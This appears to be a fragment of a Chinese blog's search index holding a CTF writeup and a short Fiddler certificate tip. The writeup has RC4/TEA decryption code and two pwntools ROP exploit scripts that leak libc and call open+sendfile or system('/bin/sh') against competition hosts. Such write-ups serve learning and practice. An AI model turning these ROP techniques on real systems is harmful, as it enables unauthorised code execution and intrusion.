class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> n = <span class="number">32</span>;</span><br><span class="line">    <span class="comment">/*初始化*/</span></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xC95D6ABF</span>; <span class="comment">/* 密钥调度常数*/</span></span><br><span class="line">    sum = <span class="number">0x20000000</span>;</span><br><span class="line">    <span class="comment">/*即0xC6EF3720 */</span></span><br><span class="line">    <span class="keyword">while</span> (n-- &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*基本循环开始*/</span></span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">1</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">0</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*循环结束*/</span></span><br><span class="line">    v[<span class="number">1</span>] = v0;</span><br><span class="line">    v[<span class="number">0</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*key, <span class="type">unsigned</span> <span class="type">long</span> Len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//char k[256]=&#123;0&#125;;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">        k[i]=key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*Data,<span class="type">unsigned</span> <span class="type">long</span> Len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k]^=s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;<span class="comment">//多开一位 不然/0溢出到k了</span></span><br><span class="line">    <span class="type">uint8_t</span> sbox[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> input[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123; <span class="number">0x00102030</span>, <span class="number">0x40506070</span>, <span class="number">0x8090A0B0</span>, <span class="number">0xC0D0E0F0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> key [] = &#123;<span class="string">&quot;04e52c7e31022b0b&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// Encrypt(input, k);</span></span><br><span class="line">    <span class="comment">// Encrypt(input + 2, k);</span></span><br><span class="line">    <span class="comment">// uint32_t enc[4] = &#123;0xda55a5c4, 0x8cccfe38, 0x234d7d23, 0xb63debe2&#125;;</span></span><br><span class="line">    <span class="type">uint32_t</span>* enc = (<span class="type">uint32_t</span>*)e;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x, 0x%x,0x%x,0x%x \n&quot;</span>, enc[<span class="number">0</span>], enc[<span class="number">1</span>], enc[<span class="number">2</span>], enc[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x, 0x%x,0x%x,0x%x \n&quot;</span>, enc[<span class="number">4</span>], enc[<span class="number">5</span>], enc[<span class="number">6</span>], enc[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">    Encrypt(enc, k);</span><br><span class="line">    Encrypt(enc + <span class="number">2</span>, k);</span><br><span class="line">    Encrypt(enc + <span class="number">4</span>, k);</span><br><span class="line">    Encrypt(enc + <span class="number">6</span>, k);</span><br><span class="line">    <span class="comment">// Encrypt(enc + 8, k);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x, 0x%x,0x%x,0x%x \n&quot;</span>, enc[<span class="number">0</span>], enc[<span class="number">1</span>], enc[<span class="number">2</span>], enc[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x, 0x%x,0x%x,0x%x \n&quot;</span>, enc[<span class="number">4</span>], enc[<span class="number">5</span>], enc[<span class="number">6</span>], enc[<span class="number">7</span>]);</span><br><span class="line">    rc4_init(sbox,key,<span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(sbox,enc,<span class="number">8</span>);</span><br><span class="line">    rc4_init(sbox,key,<span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(sbox,enc + <span class="number">2</span>,<span class="number">8</span>);</span><br><span class="line">    rc4_init(sbox,key,<span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(sbox,enc + <span class="number">4</span>,<span class="number">8</span>);</span><br><span class="line">    rc4_init(sbox,key,<span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(sbox,enc + <span class="number">6</span>,<span class="number">8</span>);</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    tmp = enc[<span class="number">0</span>];</span><br><span class="line">    enc[<span class="number">0</span>] = enc[<span class="number">1</span>];</span><br><span class="line">    enc[<span class="number">1</span>] = tmp;</span><br><span class="line"></span><br><span class="line">    tmp = enc[<span class="number">2</span>];</span><br><span class="line">    enc[<span class="number">2</span>] = enc[<span class="number">3</span>];</span><br><span class="line">    enc[<span class="number">3</span>] = tmp;</span><br><span class="line"></span><br><span class="line">    tmp = enc[<span class="number">4</span>];</span><br><span class="line">    enc[<span class="number">4</span>] = enc[<span class="number">5</span>];</span><br><span class="line">    enc[<span class="number">5</span>] = tmp;</span><br><span class="line"></span><br><span class="line">    tmp = enc[<span class="number">6</span>];</span><br><span class="line">    enc[<span class="number">6</span>] = enc[<span class="number">7</span>];</span><br><span class="line">    enc[<span class="number">7</span>] = tmp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>((<span class="type">char</span> *)enc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn-部分"><a href="#pwn-部分" class="headerlink" title="pwn 部分"></a>pwn 部分</h2><h3 id="MessageBoard"><a href="#MessageBoard" class="headerlink" title="MessageBoard"></a>MessageBoard</h3><p>迁移栈到bss段上，执行<code>open + sendfile</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&#x27;PWNLIB_NOTERM&#x27;</span>] = <span class="string">&#x27;True&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x0000000000023b6a: pop rdi; ret; &#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000023b6a</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x000000000002601f: pop rsi; ret; &#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rsi =  <span class="number">0x000000000002601f</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x0000000000142c92: pop rdx; ret; &#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdx = <span class="number">0x0000000000142c92</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x000000000010257e: pop rcx; pop rbx; ret; &#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rcx_rbx = <span class="number">0x000000000010257e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tcp.cloud.dasctf.com&quot;</span>,<span class="number">24809</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&#x27;../xhljmessgeboard&#x27;])</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;../xhljmessgeboard&#x27;</span>)</span><br><span class="line">so = ELF(<span class="string">&quot;../libc.so.6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%31$p&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">243</span> - so.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">so.address = addr</span><br><span class="line"><span class="comment"># addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;)) - 243 - so.sym[&#x27;__libc_start_main&#x27;]</span></span><br><span class="line">success(<span class="string">&quot;addr =&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">p.send(cyclic(<span class="number">0xb0</span>) + p64(elf.bss(<span class="number">0x150</span>)) + p64(<span class="number">0x401378</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&quot;/flag\x00\x00\x00&quot;</span> + p64(pop_rdi + addr) + p64(elf.bss(<span class="number">0x150</span>) - <span class="number">0xb0</span>)</span><br><span class="line">payload += p64(pop_rsi + addr) + p64(<span class="number">0</span>) + p64(so.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi + addr ) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi + addr ) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rdx + addr ) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rcx_rbx + addr ) + p64(<span class="number">0x7fff</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(so.sym[<span class="string">&#x27;sendfile&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xb0</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(elf.bss(<span class="number">0x150</span>)- <span class="number">0xb0</span>) + p64(<span class="number">0x4013a2</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h3><p><code>off-by-null</code>+ 任意写一个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number-%d:&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    buf[(<span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">    v0 = strtol(buf, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">    v3[i] = v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>z3先上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  z3 <span class="keyword">import</span>  *</span><br><span class="line">v5 = Int(<span class="string">&#x27;v5&#x27;</span>)</span><br><span class="line">v4 = Int(<span class="string">&#x27;v4&#x27;</span>)</span><br><span class="line">v3 = Int(<span class="string">&#x27;v3&#x27;</span>)</span><br><span class="line">v6 = Int(<span class="string">&#x27;v6&#x27;</span>)</span><br><span class="line">v13 = Int(<span class="string">&#x27;v13&#x27;</span>)</span><br><span class="line">v16 = Int(<span class="string">&#x27;v16&#x27;</span>)</span><br><span class="line">v8 = Int(<span class="string">&#x27;v8&#x27;</span>)</span><br><span class="line">v9 = Int(<span class="string">&#x27;v9&#x27;</span>)</span><br><span class="line">v8 = Int(<span class="string">&#x27;v8&#x27;</span>)</span><br><span class="line">v7 = Int(<span class="string">&#x27;v7&#x27;</span>)</span><br><span class="line">v10 = Int(<span class="string">&#x27;v10&#x27;</span>)</span><br><span class="line">v15 = Int(<span class="string">&#x27;v15&#x27;</span>)</span><br><span class="line">v18 = Int(<span class="string">&#x27;v18&#x27;</span>)</span><br><span class="line">v11 = Int(<span class="string">&#x27;v11&#x27;</span>)</span><br><span class="line">v12 = Int(<span class="string">&#x27;v12&#x27;</span>)</span><br><span class="line">v14 = Int(<span class="string">&#x27;v14&#x27;</span>)</span><br><span class="line">v17 = Int(<span class="string">&#x27;v17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(v5 * v4 * v3 - v6 == <span class="number">36182</span>)</span><br><span class="line">s.add(v3 == <span class="number">19</span>)</span><br><span class="line">s.add(v5 * <span class="number">19</span> * v4 + v6 == <span class="number">36322</span>)</span><br><span class="line">s.add((v13 + v3 - v8) * v16 == <span class="number">32835</span>)</span><br><span class="line">s.add((v4 * v3 - v5) * v6 == <span class="number">44170</span>)</span><br><span class="line">s.add((v5 + v4 * v3) * v6 == <span class="number">51590</span>)</span><br><span class="line">s.add(v9 * v8 * v7 - v10 == <span class="number">61549</span>)</span><br><span class="line">s.add(v10 * v15 + v4 + v18 == <span class="number">19037</span>)</span><br><span class="line">s.add(v9 * v8 * v7 + v10 == <span class="number">61871</span>)</span><br><span class="line">s.add((v8 * v7 - v9) * v10 == <span class="number">581693</span>)</span><br><span class="line">s.add(v11 == <span class="number">50</span>)</span><br><span class="line">s.add((v9 + v8 * v7) * v10 == <span class="number">587167</span>)</span><br><span class="line">s.add(v13 * v12 * v11 - v14 == <span class="number">1388499</span>)</span><br><span class="line">s.add(v13 * v12 * v11 + v14 == <span class="number">1388701</span>)</span><br><span class="line">s.add((v12 * v11 - v13) * v14 == <span class="number">640138</span>)</span><br><span class="line">s.add((v11 * v5 - v16) * v12 == <span class="number">321081</span>)</span><br><span class="line">s.add((v13 + v12 * v11) * v14 == <span class="number">682962</span>)</span><br><span class="line">s.add(v17 * v16 * v15 - v18 == <span class="number">563565</span>)</span><br><span class="line">s.add(v17 * v16 * v15 + v18 == <span class="number">563571</span>)</span><br><span class="line">s.add(v14 == <span class="number">101</span>)</span><br><span class="line">s.add((v16 * v15 - v17) * v18 == <span class="number">70374</span>)</span><br><span class="line">s.add((v17 + v16 * v15) * v18 == <span class="number">70518</span>)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>修改返回地址低位到<code>leave; ret;</code>，同时<code>rbp</code>低位被清零，在远程环境下，<code>rsp</code>能刚好落在第一次输入的<code>[0:0x100 - 0x30]</code>附近</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&#x27;PWNLIB_NOTERM&#x27;</span>] = <span class="string">&#x27;True&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = remote(<span class="string">&quot;tcp.cloud.dasctf.com&quot;</span>, <span class="number">22492</span>)</span><br><span class="line"><span class="comment"># p = process([&#x27;../babycalc&#x27;])</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;../babycalc&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;24\x00\x00&quot;</span> + p32(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0400BB8</span>) * <span class="number">20</span> + p64(<span class="number">0x400CA3</span>) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x400C1A</span> ) + p64(<span class="number">0x400789</span>)</span><br><span class="line">payload += p8(<span class="number">19</span>) + p8(<span class="number">36</span>) + p8(<span class="number">53</span>) + p8(<span class="number">70</span>) + p8(<span class="number">55</span>) + p8(<span class="number">66</span>) + p8(<span class="number">17</span>) + p8(<span class="number">161</span>)</span><br><span class="line">payload += p8(<span class="number">50</span>) + p8(<span class="number">131</span>) + p8(<span class="number">212</span>) + p8(<span class="number">101</span>) + p8(<span class="number">118</span>) + p8(<span class="number">199</span>) + p8(<span class="number">24</span>) + p8(<span class="number">3</span>)</span><br><span class="line">payload += p32(<span class="number">0x400BB8</span>) * <span class="number">1</span> + p64(<span class="number">0x400CA3</span>) + p64(<span class="number">0x602000</span>) + p64(<span class="number">0x4007B4</span>) + p32(<span class="number">0x38</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;good done\n&quot;</span>)</span><br><span class="line">puts = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;puts =&gt; &quot;</span> + <span class="built_in">hex</span>(puts))</span><br><span class="line">addr = puts - <span class="number">0x06f6a0</span></span><br><span class="line">success(<span class="string">&quot;base =&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">system = puts - <span class="number">0x06f6a0</span> + <span class="number">0x453a0</span></span><br><span class="line">str_bin_sh = puts - <span class="number">0x06f6a0</span> + <span class="number">0x18ce57</span></span><br><span class="line">payload = <span class="string">&quot;24\x00\x00&quot;</span> + p32(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># payload += p64(0x0400BB8) * 20 + p64(0x400CA3) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) + p64(0x400789) + p64(0x400789)</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x0400BB8</span>) * <span class="number">19</span> + p64(<span class="number">0x400CA3</span>) + p64(str_bin_sh) +p64(<span class="number">0x0400BB8</span>)  + p64(system) + p64(</span><br><span class="line"><span class="number">0x400789</span>) + p64(<span class="number">0x400789</span>)</span><br><span class="line">payload += p8(<span class="number">19</span>) + p8(<span class="number">36</span>) + p8(<span class="number">53</span>) + p8(<span class="number">70</span>) + p8(<span class="number">55</span>) + p8(<span class="number">66</span>) + p8(<span class="number">17</span>) + p8(<span class="number">161</span>)</span><br><span class="line">payload += p8(<span class="number">50</span>) + p8(<span class="number">131</span>) + p8(<span class="number">212</span>) + p8(<span class="number">101</span>) + p8(<span class="number">118</span>) + p8(<span class="number">199</span>) + p8(<span class="number">24</span>) + p8(<span class="number">3</span>)</span><br><span class="line">payload += p32(<span class="number">0x400BB8</span>) * <span class="number">1</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x400789</span>) + p32(<span class="number">0x38</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fiddler证书有效期时长设置</title>
      <link href="/fiddler%E8%AF%81%E4%B9%A6%E6%9C%89%E6%95%88%E6%9C%9F%E6%97%B6%E9%95%BF%E8%AE%BE%E7%BD%AE/"/>
      <url>/fiddler%E8%AF%81%E4%B9%A6%E6%9C%89%E6%95%88%E6%9C%9F%E6%97%B6%E9%95%BF%E8%AE%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>chromium 85 以后，2020-09-01 以后签发的HTTPS TLS 证书的有效期最多不超过398天，这导致fiddler默认的根证书无效，无法抓包。</p><blockquote><p>Beginning with Chrome 85, TLS server certificates issued on or after 2020-09-01 00:00:00 UTC will be required to have a validity period of 398 days or less. This will only apply to TLS server certificates from CAs that are trusted in a default installation of Google Chrome, commonly known as “publicly trusted CAs”, and will not apply to locally-operated CAs that have been manually configured.</p><p>Certificates that do not comply with this requirement will not work, and may cause webpages to fail to load or to render incorrectly.</p><p>If a certificate that does not comply with this requirement is issued by a CA trusted in a default installation of Google Chrome, this will be treated as a failure to comply with the security policies necessary to being a trusted CA, and may result in the removal of trust of that CA’s certificates.</p></blockquote><p>需要重新配置Fiddler的证书有效期。</p><span id="more"></span><p>打开Fiddler的选项-HTTPS页面，提示证书由<code>CertMaker.dll</code>签发。</p><p><img src="/./fiddler%E8%AF%81%E4%B9%A6%E6%9C%89%E6%95%88%E6%9C%9F%E6%97%B6%E9%95%BF%E8%AE%BE%E7%BD%AE/Snipaste_2021-12-16_09-11-27.png" alt="证书来自CertMaker.dll"></p><p>把这个<code>CertMaker.dll</code>扔进<code>dnspy</code>里面看一下。</p><p>有两个字段控制了证书的生成时间。</p><p><img src="/./fiddler%E8%AF%81%E4%B9%A6%E6%9C%89%E6%95%88%E6%9C%9F%E6%97%B6%E9%95%BF%E8%AE%BE%E7%BD%AE/a.png" alt="a"></p><p>在<code>QuickExec</code> 执行 <code>about:config</code>（Fiddler抓包界面下面的命令行）<br><code>fiddler.certmaker.bc.ee.yearsvalid</code> 是 有效年份<br><code>fiddler.certmaker.bc.ee.CreatedDaysAgo</code> 是 起始日期<br>这里年份填1，起始日期填-7就行了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Fiddler </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
